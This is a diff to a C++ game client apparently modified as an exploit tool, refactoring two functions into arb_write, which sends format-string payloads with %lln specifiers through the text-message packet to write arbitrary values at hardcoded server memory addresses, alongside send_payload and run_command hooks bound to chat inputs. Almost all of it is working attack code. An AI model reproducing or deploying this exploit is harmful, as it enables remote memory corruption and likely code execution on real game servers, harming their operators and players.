@@ -288,26 +288,23 @@ void send_payload()
     sendpackettoserv(1, p.finalize());
 }
 
-void write_address()
+void arb_write(unsigned long long addr, unsigned long long val)
 {
-    unsigned long long address = 0x446290;
-    std::stringstream format;
-    format << "hello%" << std::to_string(address - 0x9) << "x%145$lln";
-    packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
-    putint(p, SV_TEXTME);
-    sendstring(format.str().c_str(), p);
-    sendpackettoserv(1, p.finalize());
-}
+    packetbuf addr_buf(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
+    packetbuf val_buf(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
+    std::stringstream addr_fmt, val_fmt;
 
-void write_value()
-{
-    unsigned long long value = 0x430df4;
-    std::stringstream format;
-    format << "world%" << std::to_string(value - 0x9) << "x%238$lln";
-    packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
-    putint(p, SV_TEXTME);
-    sendstring(format.str().c_str(), p);
-    sendpackettoserv(1, p.finalize());
+    addr_fmt << "hello%" << std::to_string(addr - 0x9) << "x%145$lln";
+    val_fmt << "world%" << std::to_string(val - 0x9) << "x%238$lln";
+
+    putint(addr_buf, SV_TEXTME);
+    sendstring(addr_fmt.str().c_str(), addr_buf);
+
+    putint(val_buf, SV_TEXTME);
+    sendstring(val_fmt.str().c_str(), val_buf);
+
+    sendpackettoserv(1, addr_buf.finalize());
+    sendpackettoserv(1, val_buf.finalize());
 }
 
 void run_command()
@@ -324,10 +321,8 @@ void toserver(char *text)
     if (!strcmp(text, "a"))
         send_payload();
     else if (!strcmp(text, "b"))
-        write_address();
+        arb_write(0x446290, 0x430df4);
     else if (!strcmp(text, "c"))
-        write_value();
-    else if (!strcmp(text, "d"))
         run_command();
     // _toserver(cmd, SV_TEXT, SV_TEAMTEXT);
 }
